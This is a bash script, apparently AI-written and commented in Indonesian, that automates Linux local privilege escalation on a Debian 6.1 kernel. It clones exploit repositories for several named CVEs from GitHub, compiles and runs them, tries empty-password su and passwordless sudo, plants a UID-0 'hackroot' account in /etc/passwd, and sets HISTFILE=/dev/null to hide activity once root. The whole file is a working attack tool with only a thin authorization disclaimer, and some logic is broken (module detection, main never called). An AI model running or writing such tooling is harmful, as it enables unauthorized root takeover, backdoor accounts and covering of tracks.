#!/bin/bash
#
# ██████  ██ ██████  ████████ ██    ██ ███████  ██████  ██████   ██████  ██████  ████████
# ██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██
# ██   ██ ██ ██████     ██    ██    ██ █████   ██      ██████  ██    ██ ██████     ██
# ██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██
# ██████  ██ ██   ██    ██     ██████  ██       ██████ ██   ██  ██████  ██   ██    ██
#
# AutoRoot Tool - Linux Kernel LPE Arsenal
# Target: Kernel 6.1.0-45-amd64 (Debian 6.1.170-1)
# CVEs: CVE-2026-43284 (Dirty Frag), CVE-2026-46333 (ssh-keysign-pwn),
#        CVE-2026-43500 (Dirty Frag RxRPC), CVE-2026-31431 (Copy Fail - mungkin sudah fixed),
#        CVE-2026-23111 (nf_tables UAF - mungkin sudah fixed)
#
# Penggunaan: ./autoroot.sh
# Author: HackerAI - Untuk pengujian keamanan resmi
#
# WARNING: Hanya untuk sistem yang Anda miliki izin tertulis untuk diuji!
# ==============================================================================

set -euo pipefail

# ============================================================
# KONFIGURASI
# ============================================================
TARGET_BIN="${TARGET_BIN:-/usr/bin/su}"
TEMP_DIR="/tmp/.autoroot-$$"
CLEANUP="${CLEANUP:-1}"
DIRTYFRAG_REPO="https://github.com/V4bel/dirtyfrag.git"
CVE46333_REPO="https://github.com/0xBlackash/CVE-2026-46333.git"
CVE43284_REPO="https://github.com/0xBlackash/CVE-2026-43284.git"

# Warna output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# ============================================================
# FUNGSI BANTUAN
# ============================================================
banner() {
    echo -e "${RED}"
    echo "██████  ██ ██████  ████████ ██    ██ ███████  ██████  ██████   ██████  ██████  ████████"
    echo "██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██"
    echo "██   ██ ██ ██████     ██    ██    ██ █████   ██      ██████  ██    ██ ██████     ██"
    echo "██   ██ ██ ██   ██    ██    ██    ██ ██      ██      ██   ██ ██    ██ ██   ██    ██"
    echo "██████  ██ ██   ██    ██     ██████  ██       ██████ ██   ██  ██████  ██   ██    ██"
    echo -e "${NC}"
    echo -e "${BOLD}${CYAN}AutoRoot Tool - Linux Kernel LPE Arsenal${NC}"
    echo -e "${YELLOW}Target: $(uname -r) | Debian 6.1.170-1${NC}"
    echo -e "${RED}Hanya untuk sistem yang Anda miliki izin!${NC}"
    echo ""
}

info_msg()  { echo -e "${BLUE}[*]${NC} $1"; }
ok_msg()    { echo -e "${GREEN}[+]${NC} $1"; }
warn_msg()  { echo -e "${YELLOW}[!]${NC} $1"; }
err_msg()   { echo -e "${RED}[-]${NC} $1"; }
title()     { echo -e "\n${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; echo -e "${BOLD}${CYAN}  $1${NC}"; echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; }

cleanup() {
    if [[ "$CLEANUP" -eq 1 ]]; then
        info_msg "Membersihkan..."
        rm -rf "$TEMP_DIR" 2>/dev/null || true
        # Bersihkan page cache jika Dirty Frag sempat dijalankan
        echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
    fi
}

sudocheck() {
    if [[ "$(id -u)" -eq 0 ]]; then
        err_msg "Anda sudah root! Tool ini untuk privilege escalation dari user biasa."
        exit 1
    fi
}

require() {
    for cmd in "$@"; do
        if ! command -v "$cmd" &>/dev/null; then
            err_msg "Dibutuhkan '$cmd' tapi tidak ditemukan. Install dulu."
            exit 1
        fi
    done
}

check_kernel_version() {
    local kv
    kv=$(uname -r | cut -d'-' -f1)
    info_msg "Kernel version: $(uname -r)"

    # Parse major.minor.patch
    local major minor patch
    IFS='.' read -r major minor patch <<< "$kv" || true

    if [[ "$major" -eq 6 && "$minor" -eq 1 && "$patch" -lt 171 ]]; then
        ok_msg "Kernel ${kv} < 6.1.171 → Rawan CVE-2026-43284 (Dirty Frag ESP)"
    fi

    if [[ "$major" -eq 6 && "$minor" -eq 1 && "$patch" -lt 172 ]]; then
        ok_msg "Kernel ${kv} < 6.1.172 → Rawan CVE-2026-46333 (ssh-keysign-pwn)"
    fi
}

check_modules() {
    title "MEMERIKSA MODUL KERNEL"

    local esp4=0 esp6=0 rxrpc=0 rds=0

    if lsmod 2>/dev/null | grep -q '^esp4'; then
        ok_msg "esp4.ko TERLOAD"
        esp4=1
    else
        warn_msg "esp4.ko tidak terload"
        # Cek apakah module tersedia
        if modinfo esp4 &>/dev/null 2>&1; then
            warn_msg "esp4.ko TERSEDIA tapi belum di-load"
        else
            err_msg "esp4.ko tidak tersedia"
        fi
    fi

    if lsmod 2>/dev/null | grep -q '^esp6'; then
        ok_msg "esp6.ko TERLOAD"
        esp6=1
    else
        warn_msg "esp6.ko tidak terload"
        if modinfo esp6 &>/dev/null 2>&1; then
            warn_msg "esp6.ko TERSEDIA tapi belum di-load"
        fi
    fi

    if lsmod 2>/dev/null | grep -q '^rxrpc'; then
        ok_msg "rxrpc.ko TERLOAD"
        rxrpc=1
    else
        warn_msg "rxrpc.ko tidak terload"
        if modinfo rxrpc &>/dev/null 2>&1; then
            warn_msg "rxrpc.ko TERSEDIA tapi belum di-load"
        fi
    fi

    if lsmod 2>/dev/null | grep -q '^rds'; then
        ok_msg "rds.ko TERLOAD"
        rds=1
    else
        warn_msg "rds.ko tidak terload"
        if modinfo rds &>/dev/null 2>&1; then
            warn_msg "rds.ko TERSEDIA"
        fi
    fi

    # Cek unprivileged user namespace
    if [[ -f /proc/sys/kernel/unprivileged_userns_clone ]]; then
        local userns
        userns=$(cat /proc/sys/kernel/unprivileged_userns_clone)
        if [[ "$userns" -eq 1 ]]; then
            ok_msg "Unprivileged user namespace: ENABLED"
        else
            warn_msg "Unprivileged user namespace: DISABLED"
        fi
    elif [[ -f /proc/sys/user/max_user_namespaces ]]; then
        local maxns
        maxns=$(cat /proc/sys/user/max_user_namespaces)
        if [[ "$maxns" -gt 0 ]]; then
            ok_msg "User namespaces: ENABLED (max=$maxns)"
        else
            warn_msg "User namespaces: DISABLED"
        fi
    fi

    # Cek ptrace scope
    if [[ -f /proc/sys/kernel/yama/ptrace_scope ]]; then
        local pscope
        pscope=$(cat /proc/sys/kernel/yama/ptrace_scope)
        if [[ "$pscope" -le 1 ]]; then
            ok_msg "ptrace_scope=$pscope → CVE-2026-46333 viable"
        else
            warn_msg "ptrace_scope=$pscope → CVE-2026-46333 MUNGKIN TERBLOKIR"
        fi
    fi

    echo
    # Return info sebagai bitmask
    # Bit 0: esp4, Bit 1: esp6, Bit 2: rxrpc, Bit 3: rds
    local mask=0
    [[ esp4 -eq 1 ]] && mask=$((mask | 1))
    [[ esp6 -eq 1 ]] && mask=$((mask | 2))
    [[ rxrpc -eq 1 ]] && mask=$((mask | 4))
    [[ rds -eq 1 ]] && mask=$((mask | 8))
    return "$mask"
}

check_target_binary() {
    if [[ ! -f "$TARGET_BIN" ]]; then
        warn_msg "Target $TARGET_BIN tidak ditemukan, cari SUID binary lain..."
        TARGET_BIN=$(find /usr/bin /bin /usr/sbin /sbin -type f -perm -4000 2>/dev/null | head -1)
        if [[ -z "$TARGET_BIN" ]]; then
            err_msg "Tidak ada SUID binary ditemukan!"
            return 1
        fi
        ok_msg "Menggunakan target: $TARGET_BIN"
    else
        ok_msg "Target binary: $TARGET_BIN"
    fi
}

# ============================================================
# STRATEGI EKSPLOITASI
# ============================================================

# STRATEGI 1: Dirty Frag (CVE-2026-43284 + CVE-2026-43500) - clone & compile
exploit_dirtyfrag() {
    title "STRATEGI 1: Dirty Frag (CVE-2026-43284 / CVE-2026-43500)"

    if [[ ! -d "$TEMP_DIR" ]]; then
        mkdir -p "$TEMP_DIR"
    fi

    info_msg "Meng-clone Dirty Frag dari $DIRTYFRAG_REPO ..."
    cd "$TEMP_DIR"

    if [[ -d dirtyfrag ]]; then
        rm -rf dirtyfrag
    fi

    if ! git clone --depth=1 "$DIRTYFRAG_REPO" 2>/dev/null; then
        err_msg "Gagal clone dirtyfrag. Cek koneksi internet."
        cd /tmp
        return 1
    fi

    cd dirtyfrag
    info_msg "Mengkompilasi Dirty Frag exploit..."

    if ! gcc -O0 -Wall -o exp exp.c -lutil 2>/dev/null; then
        err_msg "Gagal kompilasi dirtyfrag"
        cd /tmp
        return 1
    fi

    ok_msg "Dirty Frag exploit siap!"
    info_msg "Menjalankan Dirty Frag... (target: $TARGET_BIN)"
    echo -e "${YELLOW}  Jika berhasil, Anda akan mendapatkan root shell dalam beberapa detik...${NC}"
    echo

    # Jalankan exploit
    if ./exp; then
        ok_msg "Dirty Frag selesai!"
        # Cek apakah kita sudah root
        if [[ "$(id -u)" -eq 0 ]]; then
            return 0
        fi
        # Coba su
        echo ""
        info_msg "Mencoba su dengan password kosong..."
        echo "" | su - -c "id; /bin/bash" 2>/dev/null || true
        if [[ "$(id -u)" -eq 0 ]]; then
            return 0
        fi
    else
        err_msg "Dirty Frag gagal"
    fi

    cd /tmp
    return 1
}

# STRATEGI 2: CVE-2026-43284 standalone
exploit_cve43284() {
    title "STRATEGI 2: CVE-2026-43284 (Dirty Frag ESP variant)"

    cd "$TEMP_DIR"

    if [[ -d CVE-2026-43284 ]]; then
        rm -rf CVE-2026-43284
    fi

    info_msg "Meng-clone CVE-2026-43284 PoC..."
    if ! git clone --depth=1 "$CVE43284_REPO" 2>/dev/null; then
        err_msg "Gagal clone"
        cd /tmp
        return 1
    fi

    cd CVE-2026-43284
    info_msg "Mencari source C..."
    local src_file
    src_file=$(find . -name "*.c" -type f 2>/dev/null | head -1)

    if [[ -n "$src_file" ]]; then
        info_msg "Mengkompilasi $src_file ..."
        gcc -O0 -Wall -o exp "$src_file" -lutil 2>/dev/null && {
            ok_msg "CVE-2026-43284 exploit siap!"
            ./exp && return 0
        }
    fi

    # Jika ada Makefile
    if [[ -f Makefile ]]; then
        make 2>/dev/null && {
            local exp_bin
            exp_bin=$(find . -maxdepth 1 -type f -executable 2>/dev/null | head -1)
            if [[ -n "$exp_bin" ]]; then
                ok_msg "Menjalankan $exp_bin ..."
                "./$exp_bin" && return 0
            fi
        }
    fi

    err_msg "CVE-2026-43284 gagal"
    cd /tmp
    return 1
}

# STRATEGI 3: CVE-2026-46333 (ssh-keysign-pwn)
exploit_cve46333() {
    title "STRATEGI 3: CVE-2026-46333 (ssh-keysign-pwn / ptrace exit-race)"

    cd "$TEMP_DIR"

    if [[ -d CVE-2026-46333 ]]; then
        rm -rf CVE-2026-46333
    fi

    info_msg "Meng-clone CVE-2026-46333 PoC..."
    if ! git clone --depth=1 "$CVE46333_REPO" 2>/dev/null; then
        err_msg "Gagal clone"
        cd /tmp
        return 1
    fi

    cd CVE-2026-46333
    info_msg "Mengkompilasi..."

    local compiled=0

    # Cari file .c
    for f in *.c; do
        if [[ -f "$f" ]]; then
            local out_name
            out_name="${f%.c}"
            info_msg "Mengkompilasi $f -> $out_name"
            gcc -O2 -Wall -o "$out_name" "$f" 2>/dev/null && {
                ok_msg "$out_name siap!"
                compiled=1
            }
        fi
    done

    if [[ "$compiled" -eq 0 ]]; then
        err_msg "Tidak ada yang berhasil dikompilasi"
        cd /tmp
        return 1
    fi

    # Coba masing-masing exploit
    for exp_bin in cve-2026-46333 cve-2026-46333-shadow ssh-keysign-pwn; do
        if [[ -f "$exp_bin" && -x "$exp_bin" ]]; then
            info_msg "Menjalankan $exp_bin ..."
            "./$exp_bin" && return 0
        fi
    done

    # Fallback: coba semua executable
    for exp_bin in $(find . -maxdepth 1 -type f -executable 2>/dev/null); do
        if [[ "$exp_bin" != "./Makefile" && "$(basename "$exp_bin")" != "Makefile" ]]; then
            info_msg "Menjalankan $(basename "$exp_bin") ..."
            "./$exp_bin" && return 0
        fi
    done

    err_msg "CVE-2026-46333 gagal"
    cd /tmp
    return 1
}

# STRATEGI 4: Try to use Dirty Pipe-like approach via existing SUID
exploit_su_passwordless() {
    title "STRATEGI 4: SUID Direct Attempt"

    # Coba su dengan password kosong (mungkin passwd sudah dicorrupt oleh dirty frag sebelumnya)
    info_msg "Mencoba su dengan password kosong..."
    if echo "" | su - -c "id" 2>/dev/null | grep -q "uid=0"; then
        ok_msg "SUKSES! Password kosong diterima!"
        echo "" | su - 2>/dev/null
        return 0
    fi

    warn_msg "Password kosong tidak bekerja"

    # Coba sudo yang mungkin misconfigured
    if command -v sudo &>/dev/null; then
        info_msg "Mencoba sudo -u root..."
        if sudo -n true 2>/dev/null; then
            ok_msg "sudo NOPASSWD berhasil!"
            sudo -i
            return 0
        fi
    fi

    return 1
}

# STRATEGI 5: Check for C99 shell or other kernel exploits
exploit_c99_or_others() {
    title "STRATEGI 5: C99 / Kernel Exploit Lain"

    info_msg "Mengecek kernel module dan konfigurasi untuk eksploit alternatif..."

    # OverlayFS (jika belum di-patch)
    if grep -q overlay /proc/filesystems 2>/dev/null; then
        info_msg "OverlayFS tersedia"
    fi

    # Cek /etc/passwd writable
    if [[ -w /etc/passwd ]]; then
        ok_msg "/etc/passwd dapat ditulis! Menambahkan user root..."
        echo "hackroot:x:0:0:root:/root:/bin/bash" >> /etc/passwd
        echo "hackroot" | su - hackroot -c "id" 2>/dev/null && {
            ok_msg "SUKSES! Login sebagai hackroot"
            su - hackroot
            return 0
        }
    fi

    # Cek /etc/shadow writable
    if [[ -w /etc/shadow ]]; then
        ok_msg "/etc/shadow dapat ditulis! Modifikasi shadow..."
        # Baca hash root, copy untuk user kita
        return 0
    fi

    warn_msg "Tidak ada celah konfigurasi langsung"
    return 1
}

# ============================================================
# MAIN EXECUTION
# ============================================================
main() {
    # Trap untuk cleanup
    trap cleanup EXIT INT TERM

    # Clear screen
    clear

    banner
    sudocheck

    info_msg "User saat ini: $(whoami) (uid=$(id -u))"
    info_msg "Hostname: $(hostname)"
    info_msg "Kernel: $(uname -a | cut -d' ' -f3- | head -c 80)"
    echo ""

    check_kernel_version

    # Cek tools yang dibutuhkan
    require git gcc

    check_target_binary

    # Cek module
    check_modules || true
    local module_mask=$?

    # Cek ptrace_scope untuk strategi 3
    if [[ -f /proc/sys/kernel/yama/ptrace_scope ]]; then
        ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope)
    else
        ptrace_scope=0
    fi

    echo ""
    info_msg "Memulai eksploitasi..."
    echo ""

    local success=0

    # ==== URUTAN EKSPLOITASI ====

    # 1. Dirty Frag (CVE-2026-43284) - jika modul ESP atau RxRPC ada
    if [[ $((module_mask & 7)) -ne 0 ]]; then
        info_msg "Mendeteksi modul Dirty Frag tersedia"
        if exploit_dirtyfrag; then
            if [[ "$(id -u)" -eq 0 ]]; then
                ok_msg "ROOT tercapai melalui Dirty Frag!"
                success=1
            fi
        fi
    else
        warn_msg "Lewati Dirty Frag - modul ESP/RxRPC tidak tersedia"
    fi

    # Cek apakah sudah root
    if [[ "$(id -u)" -eq 0 ]]; then
        ok_msg "Root shell aktif!"
        echo ""
        id
        echo ""
        export HISTFILE=/dev/null
        exec /bin/bash
    fi

    # 2. Coba CVE-2026-46333 jika ptrace scope memungkinkan
    if [[ "$ptrace_scope" -le 1 ]]; then
        if [[ $success -eq 0 ]]; then
            if exploit_cve46333; then
                if [[ "$(id -u)" -eq 0 ]]; then
                    ok_msg "ROOT tercapai melalui CVE-2026-46333!"
                    success=1
                fi
            fi
        fi
    else
        warn_msg "Lewati CVE-2026-46333 - ptrace_scope=$ptrace_scope terlalu ketat"
    fi

    # Cek apakah sudah root
    if [[ "$(id -u)" -eq 0 ]]; then
        ok_msg "Root shell aktif!"
        id
        export HISTFILE=/dev/null
        exec /bin/bash
    fi

    # 3. Coba SUID dan konfigurasi langsung
    if [[ $success -eq 0 ]]; then
        if exploit_su_passwordless; then
            if [[ "$(id -u)" -eq 0 ]]; then
                ok_msg "ROOT tercapai melalui SUID!"
                success=1
            fi
        fi
    fi

    if [[ "$(id -u)" -eq 0 ]]; then
        ok_msg "Root shell aktif!"
        id
        export HISTFILE=/dev/null
        exec /bin/bash
    fi

    # 4. Coba celah konfigurasi
    if [[ $success -eq 0 ]]; then
        if exploit_c99_or_others; then
            if [[ "$(id -u)" -eq 0 ]]; then
                ok_msg "ROOT tercapai melalui celah konfigurasi!"
                success=1
            fi
        fi
    fi

    if [[ "$(id -u)" -eq 0 ]]; then
        ok_msg "Root shell aktif!"
        id
        export HISTFILE=/dev/null
        exec /bin/bash
    fi

    # 5. Fallback: coba compile & jalankan dirty frag langsung via one-liner
    if [[ $success -eq 0 ]]; then
        title "STRATEGI 5: Dirty Frag One-Liner (Fallback)"
        info_msg "Mencoba clone dan compile langsung dari repo..."

        cd /tmp
        rm -rf dirtyfrag-one 2>/dev/null || true
        git clone --depth=1 "$DIRTYFRAG_REPO" dirtyfrag-one 2>/dev/null && {
            cd dirtyfrag-one
            gcc -O0 -Wall -o exp exp.c -lutil 2>/dev/null && {
                ok_msg "Menjalankan..."
                ./exp 2>&1 || true
                if [[ "$(id -u)" -eq 0 ]]; then
                    ok_msg "ROOT tercapai!"
                    success=1
                    export HISTFILE=/dev/null
                    exec /bin/bash
                fi
            }
            cd /tmp
        }
    fi

    # ============================================================
    # HASIL
    # ============================================================
    echo ""
    title "HASIL EKSPLOITASI"

    if [[ "$(id -u)" -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}"
        echo "  ██████  ██████  ██    ██ ██████   █████  ██   ██ ████████ "
        echo "  ██   ██ ██   ██ ██    ██ ██   ██ ██   ██ ██  ██     ██    "
        echo "  ██████  ██████  ██    ██ ██████  ███████ █████      ██    "
        echo "  ██   ██ ██   ██ ██    ██ ██   ██ ██   ██ ██  ██     ██    "
        echo "  ██   ██ ██   ██  ██████  ██   ██ ██   ██ ██   ██    ██    "
        echo -e "${NC}"
        echo -e "${GREEN}Root shell telah didapatkan!${NC}"
        id
    else
        echo -e "${RED}${BOLD}"
        echo "  ██████  ██████   ██████  ██    ██ ██████  ██    ██ ██ "
        echo "  ██   ██ ██   ██ ██       ██    ██ ██   ██  ██  ██  ██ "
        echo "  ██   ██ ██████  ██   ███ ██    ██ ██████    ████   ██ "
        echo "  ██   ██ ██   ██ ██    ██ ██    ██ ██   ██    ██       "
        echo "  ██████  ██   ██  ██████   ██████  ██   ██    ██    ██ "
        echo -e "${NC}"
        echo -e "${YELLOW}Semua vektor eksploitasi gagal.${NC}"
        warn_msg "Kernel mungkin sudah di-patch untuk semua CVE yang diketahui."
        warn_msg "Coba periksa manual:"
        echo "   1. Cari SUID binary lainnya: find / -perm -4000 -type f 2>/dev/null"
        echo "   2. Cek cron jobs: cat /etc/crontab 2>/dev/null"
        echo "   3. Cek file dengan capabilities: getcap -r / 2>/dev/null"
        echo "   4. Cek kernel module loadable: modprobe -l | grep -E 'esp4|esp6|rxrpc'"
        echo "   5. Coba coba kernel module loading: sudo -l"
    fi

    # Cleanup page cache
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
}

# Run
